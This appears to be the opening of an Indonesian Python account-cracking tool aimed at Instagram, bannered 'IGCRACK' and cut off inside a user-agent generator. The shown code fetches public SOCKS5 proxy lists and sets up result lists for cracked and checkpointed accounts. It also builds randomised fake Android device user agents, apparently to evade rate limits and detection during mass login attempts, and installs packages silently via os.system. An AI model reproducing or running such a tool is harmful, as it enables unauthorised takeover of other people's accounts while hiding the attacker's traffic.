# coding:utf-8
#/usr/bin/python
#KATANYA AUTHOR KOK UP SC IGE LANGSUNG DI HAPUS 
#PASTEBIN NYA CUAKSSS MALU LAH KONTOL
try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import stdiomask
	import urllib.request
	import urllib.parse
	import calendar
	import base64,subprocess
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re,binascii,base64,struct
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from rich.progress import track
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.tree import Tree
from rich import print as prints

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
try:
	file_color = open("assets/theme_color","r").read()
	color_rich = file_color.split("|")[0]
	color_table = file_color.split("|")[1]
except:
	color_rich = "[#afafff]"
	color_table = "#9F9F9F"
sys.stdout.write('\x1b]2; JODOHMU\x07')
try:
	os.mkdir('result')
except:
	pass
try:os.mkdir("assets")
except:pass
SE = "[#9F9F9F]" # ABU
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
bc = '[bold cyan]'
acakrich=random.choice([H2,K2,B2,U2,N2,O2,J2,A2])
hapus  = '[/]'
zx=[]
try:
	link = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
	open('.prox.txt','w').write(link)
except:pass
try:
	from cleantext import clean
except:
	os.system("pip3 install clean-text")
	os.system("pip3 install Unidecode")
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
#USN="Mozilla/5.0 (Linux; Android 9; K9 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 Instagram 307.0.0.34.111 Android (28/9; 480dpi; 1080x2004; OUKITEL; K9; K9; mt6765; es_ES; 532277880)"
USN="Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36 Instagram 318.0.0.30.110 Android (28/9; 420dpi; 1080x2094; samsung; SM-G955F; dream2lte; samsungexynos8895; pt_BR; 566040981)"
#USN="Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM3.171019.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (27/8.1.0; 420dpi; 1080x1794; LGE/google; Nexus 5X; bullhead; bullhead; ru_UA; 98288242)"
#ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],["sukses"]
HARIS={}
HARIS1={}
method=[]
ugen=[]
s=requests.Session()
zx=[]
baru=[]
ncek=[]
til = "ncek"
hapus  = '[/]'
biru_m = '[bold cyan]'
# CLEAR
def clear():
	os.system('clear')
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Sore"
	else:timenow = "Selamat Malam"
	return timenow
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
def get_proxies():
    try:
        # Mengambil daftar proxy dari Proxyscrape
        response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all")
        if response.ok:
            proxy_list = response.text.splitlines()
            return proxy_list
        else:
            print("Gagal mendapatkan proxy, status code:", response.status_code)
            return []
    except Exception as e:
        print(f"Gagal mendapatkan proxy, error: {e}")
        return []

proxy_list = get_proxies()
if proxy_list:
    # Menggunakan proxy pertama dalam daftar
    proxies = {
        'http': f'socks5://{proxy_list[0]}',
        'https': f'socks5://{proxy_list[0]}'
    }
else:
    proxies = None  # Atau Anda bisa mengatur proxy default atau handling lainnya
def banner():
	clear()
	au=f"""
\t  {J2}██▓  ▄████  ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀
\t  {J2}▓██▒ ██▒ ▀█▒▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
\t  {J2}▒██▒▒██░▄▄▄░▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
\t  {J2}░██░░▓█  ██▓▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
\t  {J2}░██░░▒▓███▀▒▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
\t  {J2}░▓   ░▒   ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
\t  {J2} ▒ ░  ░   ░   ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
\t  {J2} ▒ ░░ ░   ░ ░          ░░   ░   ░   ▒   ░        ░ ░░ ░ 
\t  {J2}░        ░ ░ ░         ░           ░  ░░ ░      ░  ░   
\t  {J2}           ░                           ░"""
	sol().print(nel(au,style=f'{color_table}',title=f'{P2}{waktu()}'))
def loadinglisen():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Sedang Verifikasi Lisensi...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
def asutol():
	a = random.choice(["7","8","9","10","12","13","14","6.0","7.0","8.0","9.0","7.1.1","8.0.0","8.1.0",f"{str(random.randint(5,9))}.0.0",f"{str(random.randint(5,9))}.0.1",f"{str(random.randint(5,9))}.1.1",f"{str(random.randint(5,9))}.1.{str(random.randint(0,1))}",f"{str(random.randint(5,9))}.0",str(random.randint(5,14))])
	b = random.choice(["LRX22C","LRX21V","LRX22G","LMY47I","LMY47V","OPM1","OPR1","O11019","TPR1","TP1A","RP1A","PPR1","PKQ1","QQ1A","QP1A","SKQ1","SP1A","RKQ1","RQ1A","QKQ1","TKQ1"])
	c = random.randrange(130000,230000)
	d = random.randrange(10,32)
	e = random.randrange(80,120)
	f = '0'
	g = random.randrange(4200,6200)
	h = random.randrange(70,200)
	i = random.choice(['MZ-m1 note','MZ-m2 note','MZ-M3s','MZ-M3','MZ-M5s','MZ-M3 Max','MZ-m3 note','MZ-MX4','MZ-U20','MZ-MX4 Pro','MZ-PRO 5','MZ-U10','MZ-M5c','MZ-meizu M8 lite','MZ-mmm52','MZ-Meizu S6','MZ-M3 Max','MZ-M1 E','MZ-meizu note9','MZ-16 X','MZ-16th Plus','MZ-15 Plus','MZ-16T','MZ-M6','MZ-PRO 7 Plus','MZ-m1 metal','MZ-16s Pro','MZ-M5 Note','MZ-Meizu 6T','MZ-16 X','MZ-16th','MZ-MEIZU 18X','MZ-MEIZU 18s','MZ-M1822','MZ-meizu 17','MZ-meizu 17 Pro','MZ-MEIZU 18 Pro','MZ-TYH212U','MZ-MEIZU 20','MZ-MEIZU 20 Pro','Meizu C3','MZ-ZTE T660','ZTE BLADE 8'])
	j = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','RMX3516','RMX3371','RMX3461','RMX3286','RMX3561','RMX3388','RMX3311','RMX3142','RMX2071','RMX1805','RMX1809','RMX1801','RMX1807','RMX1803','RMX1825','RMX1821','RMX1822','RMX1833','RMX1851','RMX1853','RMX1827','RMX1911','RMX1919','RMX1927','RMX1971','RMX1973','RMX2030','RMX2032','RMX1925','RMX1929','RMX2001','RMX2061','RMX2063','RMX2040','RMX2042','RMX2002','RMX2151','RMX2163','RMX2155','RMX2170','RMX2103','RMX3085','RMX3241','RMX3081','RMX3151','RMX3381','RMX3521','RMX3474','RMX3471','RMX3472','RMX3392','RMX3393','RMX3491','RMX1811','RMX2185','RMX3231','RMX2189','RMX2180','RMX2195','RMX2101','RMX1941','RMX1945','RMX3063','RMX3061','RMX3201','RMX3203','RMX3261','RMX3263','RMX3193','RMX3191','RMX3195','RMX3197','RMX3265','RMX3268','RMX3269','RMX2027','RMX2020','RMX2021','RMX3581','RMX3501','RMX3503','RMX3511','RMX3310','RMX3312','RMX3551','RMX3301','RMX3300','RMX2202','RMX3363','RMX3360','RMX3366','RMX3361','RMX3031','RMX3370','RMX3357','RMX3560','RMX3562','RMX3350','RMX2193','RMX2161','RMX2050','RMX2156','RMX3242','RMX3171','RMX3430','RMX3235','RMX3506','RMX2117','RMX2173','RMX3161','RMX2205','RMX3462','RMX3478','RMX3372','RMX3574','RMX1831','RMX3121','RMX3122','RMX3125','RMX3043','RMX3042','RMX3041','RMX3092','RMX3093','RMX3571','RMX3475','RMX2200','RMX2201','RMX2111','RMX2112','RMX1901','RMX1903','RMX1992','RMX1993','RMX1991','RMX1931','RMX2142','RMX2081','RMX2085','RMX2083','RMX2086','RMX2144','RMX2051','RMX2025','RMX2075','RMX2076','RMX2072','RMX2052','RMX2176','RMX2121','RMX3115','RMX1921'])
	k = random.choice(['CPH1869','CPH1929','CPH2107','CPH2238','CPH2389','CPH2401','CPH2407','CPH2413','CPH2415','CPH2417','CPH2419','CPH2455','CPH2459','CPH2461','CPH2471','CPH2473','CPH2477','CPH8893','CPH2321','CPH2341','CPH2373','CPH2083','CPH2071','CPH2077','CPH2185','CPH2179','CPH2269','CPH2421','CPH2349','CPH2271','CPH1923','CPH1925','CPH1837','CPH2015','CPH2073','CPH2081','CPH2029','CPH2031','CPH2137','CPH1605','CPH1803','CPH1853','CPH1805','CPH1809','CPH1851','CPH1931','CPH1959','CPH1933','CPH1935','CPH1943','CPH2061','CPH2069','CPH2127','CPH2131','CPH2139','CPH2135','CPH2239','CPH2195','CPH2273','CPH2325','CPH2309','CPH1701','CPH2387','CPH1909','CPH1920','CPH1912','CPH1901','CPH1903','CPH1905','CPH1717','CPH1801','CPH2067','CPH2099','CPH2161','CPH2219','CPH2197','CPH2263','CPH2375','CPH2339','CPH1715','CPH2385','CPH1729','CPH1827','CPH1938','CPH1937','CPH1939','CPH1941','CPH2001','CPH2021','CPH2059','CPH2121','CPH2123','CPH2203','CPH2333','CPH2365','CPH1913','CPH1911','CPH1915','CPH1969','CPH2209','CPH1987','CPH2095','CPH2119','CPH2285','CPH2213','CPH2223','CPH2363','CPH1609','CPH1613','CPH1723','CPH1727','CPH1725','CPH1819','CPH1821','CPH1825','CPH1881','CPH1823','CPH1871','CPH1875','CPH2023','CPH2005','CPH2025','CPH2207','CPH2173','CPH2307','CPH2305','CPH2337','CPH1955','CPH1707','CPH1719','CPH1721','CPH1835','CPH1831','CPH1833','CPH1879','CPH1893','CPH1877','CPH1607','CPH1611','CPH1917','CPH1919','CPH1907','CPH1989','CPH1945','CPH1951','CPH2043','CPH2035','CPH2037','CPH2036','CPH2009','CPH2013','CPH2113','CPH2091','CPH2125','CPH2109','CPH2089','CPH2065','CPH2159','CPH2145','CPH2205','CPH2201','CPH2199','CPH2217','CPH1921','CPH2211','CPH2235','CPH2251','CPH2249','CPH2247','CPH2237','CPH2371','CPH2293','CPH2353','CPH2343','CPH2359','CPH2357','CPH2457','CPH1983','CPH1979','oppo f 5 plus','OPPO F1','OPPO F1 Plus','PEPM00','PEDM00','PCHM10','PCLM10','PCCM00','PDBM00','OPPO PBBM30','OPPO A31','OPPO F1s','A31','OPPO R11s','OPPO A37m'])
	l = random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X676B','Infinix X687','Infinix X609','Infinix X697','Infinix X680D','Infinix X507','Infinix X605','Infinix X668','Infinix X6815B','Infinix X624','Infinix X655F','Infinix X689C','Infinix X608','Infinix X698','Infinix X682C','Infinix X688C','Infinix X689B','Infinix X689','Infinix X689D','Infinix X662','Infinix X662B','Infinix X675','Infinix X6812B','Infinix X6812','Infinix X6817B','Infinix X6817','Infinix X6816C','Infinix X6816','Infinix X6816D','Infinix X668C','Infinix X665B','Infinix X665E','Infinix X510','Infinix X559C','Infinix X559F','Infinix X559','Infinix X606','Infinix X606C','Infinix X606D','Infinix X623','Infinix X624B','Infinix X625C','Infinix X625D','Infinix X625B','Infinix X650D','Infinix X650B','Infinix X650','Infinix X650C','Infinix X655C','Infinix X655D','Infinix X680B','Infinix X573','Infinix X573B','Infinix X622','Infinix X693','Infinix X695C','Infinix X695D','Infinix X695','Infinix X663B','Infinix X663','Infinix X670','Infinix X671','Infinix X671B','Infinix X672','Infinix X6819','Infinix X572','Infinix X572-LTE','Infinix X571','Infinix X604','Infinix X610B','Infinix X690','Infinix X690B','Infinix X656','Infinix X692','Infinix X683','Infinix X450','Infinix X5010','Infinix X501','Infinix X401','Infinix X626','Infinix X626B','Infinix X652','Infinix X652A','Infinix X652B','Infinix X652C','Infinix X660B','Infinix X660C','Infinix X660','Infinix X5515','Infinix X5515F','Infinix X5515I','Infinix X609B','Infinix X5514D','Infinix X5516B','Infinix X5516C','Infinix X627','Infinix X680','Infinix X653','Infinix X653C','Infinix X657','Infinix X657B','Infinix X657C','Infinix X6511B','Infinix X6511E','Infinix X6511','Infinix X6512','Infinix X6823C','Infinix X612B','Infinix X612','Infinix X503','Infinix X511','Infinix X352','Infinix X351','Infinix X530','Infinix X676C','Infinix X6821','Infinix X6823','Infinix X6827','Infinix X509','Infinix X603','Infinix X6815','Infinix X620B','Infinix X620','Infinix X687B','Infinix X6811B','Infinix X6810','Infinix X6811',f"Infinix X{str(random.randint(550,699))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(5511,5516))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(6711,6899))}{random.choice(['B','C','D','E','F',''])}"])
	m = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750','GT-I9300','TECNO CD8','itel L6005','itel L6501','TECNO KE7','TECNO IN2','TECNO CD6j','TECNO BD2p','TECNO KD7h','TECNO LA7','itel W6004','MobiGo2','TECNO LC6','TECNO KB7j','itel S661W','TB300FU','S96GT','ZTE A2023G','OPPO A79kt','TECNO CI7n','MP1718','V2154A','SAMSUNG SM-M346B','itel S663L','CHL-AL00','vivo Z3x','CHL-AL00','ivvi P60(i8)'])
	n = random.choice([f'{str(random.randint(10,18))}_{str(random.randint(0,9))}_{str(random.randint(0,9))}',f'{str(random.randint(10,18))}_{str(random.randint(0,9))}'])
	o = random.choice(["en-us","en-gb","id-id","de-de","ru-ru","en-sg","my-sg","fr-fr","fa-ir","ja-jp","pt-br","cs-cz","zh-hk","zh-cn","vi-vn","en-ph","en-in","tr-tr","es-es","it-it","zh-tw"])
	z = random.choice([
		f"Mozilla/5.0 (Linux; U; Android {a}; {o}; Teracube One Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h}{random.choice([f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,20))}.110-{str(random.randint(2000000000,2029999999))} UWS/2.15.0.4',f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,10))}.{str(random.randint(0,10))} UWS/2.15.0.2',f' MZBrowser/{str(random.randint(8,10))}.{str(random.randint(0,20))}.{str(random.randint(0,20))}',f' MQQBrowser/{str(random.randint(4,10))}.{str(random.randint(0,9))}',f' UCBrowser/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(100,1299))}'])} Mobile Safari/537.36",
		f"Mozilla/5.0 (Linux; Android {a}; X1030X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; Android {a}; {k} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; Android {a}; {l} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; Android {a}; {m} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' 